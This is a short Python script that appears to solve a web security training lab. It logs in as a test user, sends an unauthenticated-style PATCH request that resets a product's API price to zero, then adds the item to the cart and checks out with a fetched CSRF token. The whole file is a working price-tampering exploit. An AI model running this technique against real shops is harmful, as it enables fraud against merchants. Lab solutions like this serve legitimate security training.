from web_security_academy.core.logger import logger
from urllib.parse import urljoin


def solve_lab(session):
    session.login("wiener", "peter")

    url = urljoin(session.url, "/api/products/1/price")
    json = {"price": 0}
    session.patch(url, json=json)
    logger.info('Changed the price of "Lightweight l33t Leather Jacket" to $0.00')

    data = {"productId": "1", "quantity": "1", "redir": "PRODUCT", "price": "1"}
    session.post_path("/cart", data=data)
    csrf = session.get_csrf_token("/cart", n=2)
    session.post_path("/cart/checkout", data={"csrf": csrf})
    logger.info('Bought a "Lightweight l33t Leather Jacket"')
